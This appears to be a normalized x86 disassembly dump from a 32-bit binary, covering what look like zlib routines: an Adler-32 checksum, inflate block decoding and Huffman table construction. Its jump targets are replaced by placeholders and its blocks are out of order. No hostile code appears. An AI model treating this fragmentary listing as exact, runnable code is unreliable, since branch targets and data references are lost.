add eax 0xb
cmp ebp ecx
jae r-xdata
lea ecx [ eax - 0xe ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
shr edx 0x5
and edx 0x1f
and eax 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jb r-xdata
mov [ ebx + 0x34 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
push ebx
call sub_10007100
mov ecx [ ebx + 0x34 ]
mov edx [ ebx + 0x30 ]
add esp 0xc
cmp edx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ esp + 0x1c ] ecx
cmp edx eax
mov [ esp + 0x20 ] eax
jne r-xdata
sub ecx edx
sub eax edx
dec eax
mov ecx eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jae r-xdata
mov ecx edx
shr edi cl
mov ecx [ esp + 0x1c ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edi
add eax ecx
mov ecx [ esp + 0x1c ]
shr edi cl
add ecx edx
mov [ esp + 0x18 ] eax
sub ebp ecx
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebx + 0x4 ]
mov edx ecx
and ecx 0x1f
shr edx 0x5
and edx 0x1f
lea ecx [ edx + ecx + 0x102 ]
mov edx [ esp + 0x1c ]
add eax edx
cmp eax ecx
ja r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov eax [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov ebp [ edi ]
mov esi [ edi + 0x8 ]
mov [ edi + 0x4 ] ecx
mov ecx eax
mov [ edi ] eax
sub ecx ebp
add esi ecx
mov [ edi + 0x8 ] esi
mov [ ebx + 0x34 ] edx
mov edx [ esp + 0x4c ]
push edx
push edi
push ebx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x14 ]
mov edx eax
cmp edx esi
mov [ esp + 0x44 ] edx
jae r-xdata
test ecx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add ecx edx
push 0xfffffffd
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_10007100
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
cmp [ esp + 0x34 ] 0x10
jne r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
cmp ebp ecx
jb r-xdata
mov ecx [ esp + 0x20 ]
sub ecx edx
sub esi edx
dec esi
mov ecx esi
jmp r-xdata
mov eax [ esp + 0x1c ]
xor ecx ecx
mov eax edx
cmp eax 0x1
jb r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
mov edx [ ebx + 0xc ]
inc eax
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx [ esp + 0x18 ]
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov ecx [ ebx + 0xc ]
mov ecx [ ecx + eax * 4 - 0x4 ]
jmp r-xdata
sub_10006020
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push 0x0
push esi
push edi
call sub_100051f0
mov eax [ edi + 0x28 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
mov edx [ edi + 0x24 ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
push edi
push ecx
call [ esi + 0x24 ]
add esp 0x24
xor eax eax
pop edi
pop esi
retn
sub_10006060
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov ecx edi
and ecx 0xffff
shr edi 0x10
test esi esi
jne r-xdata
push ebx
mov ebx [ esp + 0x18 ]
test ebx ebx
jbe r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax edi
pop ebx
shl eax 0x10
pop edi
or eax ecx
pop esi
retn
push ebp
sub ebx eax
cmp eax 0x10
jl r-xdata
mov eax 0x15b0
test eax eax
je r-xdata
mov ebp eax
shr ebp 0x4
mov edx ebp
neg edx
shl edx 0x4
add eax edx
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov eax edi
mov edi 0xfff1
mov ecx edx
xor edx edx
div edi
test ebx ebx
mov edi edx
ja r-xdata
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
xor edx edx
mov dl [ esi ]
add esi 0x10
add ecx edx
xor edx edx
mov dl [ esi - 0xf ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xe ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xd ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xc ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xb ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xa ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x9 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x8 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x7 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x6 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x5 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x4 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x3 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x2 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x1 ]
add edi ecx
add ecx edx
add edi ecx
dec ebp
jne r-xdata
cmp ebx 0x15b0
mov eax ebx
jb r-xdata
pop ebp
sub_100061c0
mov eax [ esp + 0x14 ]
push 0x1c
push 0x1
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x20 ]
add esp 0xc
test eax eax
je r-xdata
retn
mov dl [ esp + 0x4 ]
mov cl [ esp + 0x8 ]
mov [ eax + 0x10 ] dl
mov edx [ esp + 0xc ]
mov [ eax + 0x11 ] cl
mov ecx [ esp + 0x10 ]
mov [ eax ] 0x0
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
sub_10006200
sub esp 0x10
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
mov edi [ esp + 0x28 ]
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
mov ecx [ edi + 0x4 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x24 ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x10 ] eax
cmp edx ecx
jae r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffe
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
jmp [ ecx * 4 + jump_table_10006980 ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0xc ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov eax [ eax + 0x8 ]
cmp ebx eax
mov [ esp + 0x18 ] eax
jae r-xdata
mov ecx edx
sub ecx [ eax + 0xc ]
mov eax [ esi + 0x28 ]
cmp ecx eax
mov [ esp + 0x18 ] ecx
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
cmp ebx 0x7
jbe r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0x1
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
push 0xfffffffd
add ecx eax
push edi
mov [ edi + 0x8 ] ecx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x10 ]
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x14 ]
mov [ eax + 0x8 ] ecx
cmp [ esp + 0x28 ] 0xa
jb r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x18 ]
xor ecx ecx
mov cl [ eax ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0x4 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
xor ecx ecx
mov cl [ eax + 0x11 ]
mov [ eax ] 0x3
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x18 ]
mov [ eax + 0x8 ] ecx
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ esp + 0x18 ] eax
mov cl [ eax + 0x1 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x1c ] ecx
sub ebx ecx
xor ecx ecx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x18 ]
mov cl [ eax ]
test cl 0x10
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
and ecx eax
mov eax [ esp + 0x10 ]
add [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
shr eax cl
mov [ esp + 0x24 ] eax
mov eax ecx
sub ebx eax
mov eax [ esp + 0x10 ]
mov [ eax ] 0x5
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x2c ]
sub ecx eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov cl [ eax + 0x8 ]
mov [ esp + 0x2c ] 0x0
mov [ edx ] cl
mov ecx [ esp + 0x14 ]
inc edx
dec ecx
mov [ esp + 0x14 ] ecx
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_10007100
mov edx [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
add esp 0xc
cmp ecx edx
je r-xdata
mov ecx [ esp + 0x28 ]
sub ebx 0x8
inc ecx
dec ebp
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] ecx
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x14 ]
push edi
push esi
push ecx
push edx
xor ecx ecx
xor edx edx
mov cl [ eax + 0x11 ]
mov dl [ eax + 0x10 ]
push ecx
push edx
call sub_10007240
mov ecx [ edi + 0x4 ]
mov edx [ esi + 0x20 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x40 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x3c ] edx
mov edx [ esi + 0x34 ]
add esp 0x18
cmp edx ecx
mov [ esp + 0x2c ] eax
jae r-xdata
test cl 0x10
je r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov [ eax ] 0x6
jmp r-xdata
mov eax [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] eax
mov ebx [ edi ]
mov eax [ edi + 0x8 ]
mov ecx ebp
sub ecx ebx
mov [ edi + 0x4 ] 0x0
add eax ecx
mov [ edi ] ebp
mov [ edi + 0x8 ] eax
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x4
mov [ eax + 0xc ] ecx
jmp r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
add eax ecx
mov ecx [ esi + 0x28 ]
cmp eax ecx
jb r-xdata
mov ecx [ eax ]
cmp ecx 0x9
ja r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_10007100
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x8
mov ecx [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ecx
mov ecx [ esp + 0x28 ]
mov ebx [ edi ]
mov [ edi + 0x4 ] ecx
mov ecx ebp
push eax
sub ecx ebx
mov ebx [ edi + 0x8 ]
add ebx ecx
push edi
mov [ edi + 0x8 ] ebx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov ecx [ esp + 0x18 ]
inc edx
mov [ esp + 0x2c ] 0x0
mov cl [ ecx ]
mov [ edx - 0x1 ] cl
mov ecx [ esp + 0x18 ]
inc ecx
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x18 ]
cmp ecx [ esi + 0x2c ]
jne r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] eax
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x10 ]
dec eax
neg eax
sbb eax eax
and eax 0x2
add eax 0x7
mov [ ecx ] eax
mov eax ecx
jmp r-xdata
test eax eax
mov [ esp + 0x14 ] ecx
je r-xdata
mov eax [ esp + 0x10 ]
test cl 0x20
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0xc ] ecx
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
lea ecx [ eax + ecx * 8 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ eax + 0x4 ]
dec ecx
mov [ eax + 0x4 ] ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ esp + 0x18 ] ecx
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_10007100
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov [ eax ] 0x7
jmp r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov [ edi + 0x8 ] ecx
mov ecx [ esp + 0x2c ]
push ecx
push edi
push esi
mov [ esi + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffd
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ esp + 0x14 ] eax
sub_100069d0
push ecx
push ebx
push edi
mov edi [ esp + 0x20 ]
push 0x4
push 0x13
mov [ esp + 0x10 ] 0x0
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
lea ecx [ esp + 0x10 ]
push ebx
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ebp
push eax
push 0x0
push 0x0
push 0x13
push 0x13
push ecx
call sub_10006a80
mov esi eax
add esp 0x28
cmp esi 0xfffffffd
jne r-xdata
pop edi
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffb
je r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
mov [ edi + 0x18 ] rw-data
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
mov [ edi + 0x18 ] rw-data
mov esi 0xfffffffd
cmp [ ebp ] 0x0
jne r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
sub_10006a80
sub esp 0x100
mov ecx [ esp + 0x104 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x114 ]
push edi
xor edi edi
mov edx esi
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] edi
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edi
mov [ esp + 0x74 ] edi
mov [ esp + 0x78 ] edi
mov [ esp + 0x7c ] edi
mov [ esp + 0x80 ] edi
mov [ esp + 0x84 ] edi
mov [ esp + 0x88 ] edi
mov [ esp + 0x8c ] edi
mov [ esp + 0x90 ] edi
mov eax [ ecx ]
add ecx 0x4
mov ebp [ esp + eax * 4 + 0x54 ]
lea eax [ esp + eax * 4 + 0x54 ]
inc ebp
dec edx
mov [ eax ] ebp
jne r-xdata
cmp [ esp + 0x54 ] esi
jne r-xdata
mov ebx [ esp + 0x12c ]
mov ecx 0x1
lea eax [ esp + 0x58 ]
mov ebp [ ebx ]
mov [ esp + 0x10 ] ebp
mov ecx [ esp + 0x128 ]
mov edx [ esp + 0x12c ]
mov [ ecx ] edi
mov [ edx ] edi
mov eax ecx
cmp ebp ecx
mov [ esp + 0x14 ] eax
jae r-xdata
inc ecx
add eax 0x4
cmp ecx 0xf
jbe r-xdata
mov edx 0xf
lea esi [ esp + 0x90 ]
mov [ esp + 0x10 ] ecx
mov ebp ecx
cmp [ eax ] edi
jne r-xdata
cmp ebp edx
mov [ esp + 0x2c ] edx
jbe r-xdata
dec edx
sub esi 0x4
cmp edx edi
jne r-xdata
mov esi 0x1
mov [ ebx ] ebp
shl esi cl
cmp ecx edx
jae r-xdata
mov [ esp + 0x10 ] edx
mov ebp edx
cmp [ esi ] edi
jne r-xdata
lea ecx [ edx * 4 ]
mov [ esp + 0x20 ] ecx
mov ebx [ esp + ecx + 0x54 ]
lea ecx [ esp + ecx + 0x54 ]
sub esi ebx
mov [ esp + 0x44 ] esi
jns r-xdata
lea ebx [ esp + ecx * 4 + 0x54 ]
add ebx esi
mov [ esp + 0x98 ] edi
mov [ ecx ] ebx
xor ecx ecx
dec edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x100
retn
inc ecx
add ebx 0x4
shl esi 0x1
cmp ecx edx
jb r-xdata
mov edx [ esp + 0x114 ]
xor ebx ebx
xor ebx ebx
sub esi [ ebx ]
js r-xdata
mov ecx [ esp + 0x118 ]
inc ebx
cmp ebx ecx
jb r-xdata
mov edx [ esp + ecx * 4 + 0x94 ]
mov esi [ esp + 0x138 ]
lea ecx [ esp + ecx * 4 + 0x94 ]
mov [ esi + edx * 4 ] ebx
mov esi [ esp + 0x44 ]
inc edx
mov [ ecx ] edx
mov edx [ esp + 0x1c ]
add ecx [ esp + ebx + 0x58 ]
add ebx 0x4
dec edx
mov [ esp + ebx + 0x98 ] ecx
jne r-xdata
mov ecx [ edx ]
add edx 0x4
cmp ecx edi
mov [ esp + 0x1c ] edx
je r-xdata
mov ecx [ esp + 0x20 ]
mov ebx ebp
neg ebx
mov edx [ esp + ecx + 0x94 ]
mov ecx [ esp + 0x138 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
cmp eax ecx
mov [ esp + 0x118 ] edx
mov [ esp + 0x38 ] edi
mov [ esp + 0x94 ] edi
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0xd4 ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] edi
jg r-xdata
cmp esi edi
je r-xdata
mov esi [ esp + 0x34 ]
lea edx [ eax - 0x1 ]
lea ecx [ esp + eax * 4 + 0x54 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
cmp [ esp + 0x2c ] 0x1
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
add ecx 0x4
inc eax
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x2c ]
inc edx
cmp eax ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] edx
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
add esp 0x100
retn
mov edx [ esp + 0x28 ]
mov edx [ edx ]
mov ecx edx
dec edx
test ecx ecx
mov [ esp + 0x24 ] edx
je r-xdata
mov esi [ esp + 0x44 ]
xor edi edi
lea ecx [ ebx + ebp ]
cmp eax ecx
jle r-xdata
mov ecx [ esp + 0x138 ]
mov dl al
mov ebp [ esp + 0x1c ]
sub dl bl
mov [ esp + 0x31 ] dl
mov edx [ esp + 0x118 ]
lea ecx [ ecx + edx * 4 ]
cmp ebp ecx
jb r-xdata
inc edx
mov [ esp + 0x50 ] edx
jmp r-xdata
mov esi [ ebp ]
mov ecx [ esp + 0x11c ]
cmp esi ecx
jae r-xdata
mov [ esp + 0x30 ] 0xc0
jmp r-xdata
mov edx [ esp + 0x18 ]
add ebx ebp
inc edx
add ecx ebp
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x2c ]
sub edx ebx
mov [ esp + 0x48 ] ecx
cmp edx ebp
jbe r-xdata
sub esi ecx
mov ecx [ esp + 0x124 ]
shl esi 0x2
mov dl [ esi + ecx ]
mov ecx [ esp + 0x120 ]
add dl 0x50
mov esi [ esi + ecx ]
mov [ esp + 0x30 ] dl
cmp esi 0x100
sbb dl dl
and dl 0xa0
add dl 0x60
mov [ esp + 0x30 ] dl
jmp r-xdata
mov ecx eax
mov edx 0x1
sub ecx ebx
